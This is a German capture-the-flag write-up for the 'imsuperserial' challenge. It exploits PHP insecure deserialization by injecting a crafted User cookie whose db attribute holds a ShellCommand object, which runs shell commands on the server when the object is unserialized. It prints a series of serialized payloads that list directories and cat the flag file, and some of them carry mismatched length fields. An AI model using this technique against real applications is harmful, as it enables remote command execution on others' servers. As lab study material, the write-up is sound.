# IMSUPERSERIAL

## Intro 
#### Vorüberlegungen 
* es gibt dieses ShellCommand - Objekt. Evtl. muss man ein serialized objekt davon erzeugen und das als cookie rein packen 
* dann kann man als attribut cmd nehmen dass über die shell die flag gesucht und angezeigt wird 
* hier evtl wieder den source code anzeigen lassen 
* der cookie von der Session hat das value "session"
* evtl muss man doch ein User Objekt erstellen und da aber iwie das shell objekt rein bauen? vllt auch nicht 
* die klassen haben beide eine methode __construct
* die kriegen halt nur andere paramter 
* evtl kann man hier property oriented programming anweden (wenn man so generische strukturen nutzt und nur klassen + attribute verändert)
* sieht aber schlecht aus mit ShellCommand objekt weil ich weiß nicht wie man das is_ok knacken soll
* aber was wäre wenn die flag in der Datenbank ist 
* dann bräuchte man nur ein user objekt und müsste mal vllt die session ids abändern 
* und die admin session finden 
* vllt ist dann da die flag 


#### Überlegung 1: über die Datenbank mit Query 
* in der DB heißt die eine funktion auch exec
* d.h. ich erstell einfach ein user objekt 
* tue in das DB attribut ein ShellCommand rein 
* bei reload sollte dann evtl die wakeup function ausgeführt werden 
* da kommt dann die datenbank query als parameter rein
* da mache ich dann in die userid die code injection dass im system dann folgendes steht: 
"SELECT * FROM SESSIONS WHERE uid=""; || echo $(ls);
* und das " könnte noch eine Fehlerquelle sein im objekt 
* (funktioniert nicht, weil es keinen query parameter in der exec() funktion von ShellCommand gibt)

#### Überlegung 2: 
* dann muss ich das komplett ShellCommand-Objekt da rein tun 
* die user construct methode wird doch eig gar nicht aufgerufen weil ja kein NEUER user erstellt wird 
* ich muss nur diese funktion wakeup callen (reload)
* dann muss nur das cmd auf das was ausgeführt werden soll gesetzt werden 
* (das hat funktioniert)


## Lösungsweg 
Hier liegt property oriented programming vor: Teilweise haben die Objekte die gleichen Funktionsnamen, d.h. je nachdem welches Objekt injected wird, wird auch dessen Funktion aufgerufen. 
Hier gab es drei Objekte (siehe imsuperserial.php): ShellCommand, DB und User. Das User-Objekt konnte über einen cookie injected werden. 

In dem User-Objekt wurde in der construct methode ein Attribut in Form eines weiteren Objekts erstellt: db mit einem DB-Objekt drin. 

Die DB-Klasse hat eine Funktion exec($query). Die Shell-Command Klasse hat auch eine Funktion exec(). Auch wenn die DB Funktionen einen Paramter erwartet, 
und die ShellCommand-Funktion nicht, heißen beide gleich. 

Die Construct-Funktionen aller Objekte wurden nur bei Neuerstellung eines Objektes aufgerufen. Wenn die Objekte injected wurden, waren alle ihre Attribute schon zugewiesen. 

Um die Aufgabe zu lösen, musste man nur Objekte injecten, aber keine neuerstellen. 

Man konnte ein User-Objekt als cookie einsetzen, das statt einem Datenbankobjekt für das Attribut db ein ShellCommand-Objekt enthielt. Diesem Objekt
konnte man das Attribut cmd hinzufügen, in das man dann einfach das Command rein schrieb, was auf dem Server ausgeführt werden sollte. 

Ein originales User-Objekt, was selbstständig von der Seite als cookie gesetzt wurde, sah so aus: 
```
O:4:"User":4:{s:3:"uid";i:1234;s:4:"name";s:5:"guest";s:2:"db";O:2:"DB":1:{s:9:"db_driver";O:8:"DBDriver":0:{}}s:6:"active";b:1;}
```
Die Query sah final so aus: 
```php
O:4:"User":4:{s:3:"uid";i:5555;s:4:"name";s:5:"mello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:63:"echo $(cd ..; cd ..; cd ..; cd opt; cat flag.txt); echo "woop";";}s:6:"active";b:1;}
```

Wenn jetzt die function __wakeup() augerufen wurde, was durch das Neuladen der Seite geschah, wurde über das Attribut db im user Objekt die Funktion exec ausgeführt. 
Da unser injiziertes User-Objekt aber ein ShellCommand-Objekt im db-Attribut hatte, wurde dessen exec-Funktion ausgeführt. 

Diese rief einfach nur das cmd-Attribut auf, welches ja ebenfalls durch die injizierung schon gesetzt wurde. (Die is_ok function wurde nie aufgerufen, weil kein neues ShellCommand-Objekt erstellt wurde.)


## ShellCommand Objekt bauen 
User Objekt: 
```
O:4:"User":4:{s:3:"uid";i:1234;s:4:"name";s:5:"guest";s:2:"db";O:2:"DB":1:{s:9:"db_driver";O:8:"DBDriver":0:{}}s:6:"active";b:1;}
```
Datenbankaufruf, wo ShellCommand rein muss: 
O:2:"DB":1:{s:9:"db_driver";O:8:"DBDriver":0:{}}s:6:"active";b:1;}

Shell Command: 
"; echo $(ls);

## Ausführung 
Die serialized php Objekte mussten immer **url encoded** werden und konnten dann als cookie eingefügt werden. 

#### Versuch 1: (mit query aufruf sozusagen/ Überlegung 1)
"; echo $(ls); // beendet erst die SQL-Query und guckt dann nach Files 
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:13:"; echo $(ls);";}s:6:"active";b:1;}
funktioniert nicht (Die DB-Query wird ja auch nie an die exec funktion des ShellCommand-Objekts geliefert)

#### Versuch 2: (nur das Command in das cmd-Attribut/ Überlegung 2)
Testcommand: echo $(ls);
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:11:"echo $(ls);";}s:6:"active";b:1;}
Das hat funktioniert: jetzt muss ich die Flag finden: 

#### Versuch 3
Ordner-Struktur darüber durchsuchen: echo $(cd ..; ls);
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:18:"echo $(cd ..; ls);";}s:6:"active";b:1;}
gefunden: Ordner html 

#### Versuch 4
Ordner-Struktur darüber durchsuchen: echo $(cd ..; cd ..; ls);
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:25:"echo $(cd ..; cd ..; ls);";}s:6:"active";b:1;}

#### Versuch 5
zum opt ordner navigieren: echo $(cd ..; cd ..; cd opt; ls)
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:46:"echo $(cd ..; cd ..; cd opt; ls); echo "woop";";}s:6:"active";b:1;}
der opt ordner ist leer

#### Versuch 6
search: find ~/ -type f -name "flag.txt" (nicht ausprobiert weil durchsucht nur home dir glaub ich)
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:54:"echo $(find ~/ -type f -name "flag.txt"); echo "woop";";}s:6:"active";b:1;}

#### Versuch 7
Ordner-Struktur darüber durchsuchen: echo $(cd ..; cd ..; cd ..; ls)
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:45:"echo $(cd ..; cd ..; cd ..; cd ..; ls -a); echo "woop";";}s:6:"active";b:1;}
Hier ist noch ein opt-Ordner

#### Versuch 8
in opt-Verzeichnis navigieren: echo $(cd ..; cd ..; cd opt; ls)
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"hello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:56:"echo $(cd ..; cd ..; cd ..; cd opt; ls -a); echo "woop";";}s:6:"active";b:1;}
Hier ist eine flag.txt im opt-Ordner!

#### Versuch 9
flag anzeigen: echo $(cd ..; cd ..; cd opt; cat flag.txt);
O:4:"User":4:{s:3:"uid";s:14:""; echo $(ls);";s:4:"name";s:5:"mello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:63:"echo $(cd ..; cd ..; cd ..; cd opt; cat flag.txt); echo "woop";";}s:6:"active";b:1;}
Das hat geklappt, flag wird angezeigt :) 

Final query, aufgehübscht: 
O:4:"User":4:{s:3:"uid";i:5555;s:4:"name";s:5:"mello";s:2:"db";O:12:"ShellCommand":1:{s:3:"cmd";s:63:"echo $(cd ..; cd ..; cd ..; cd opt; cat flag.txt); echo "woop";";}s:6:"active";b:1;}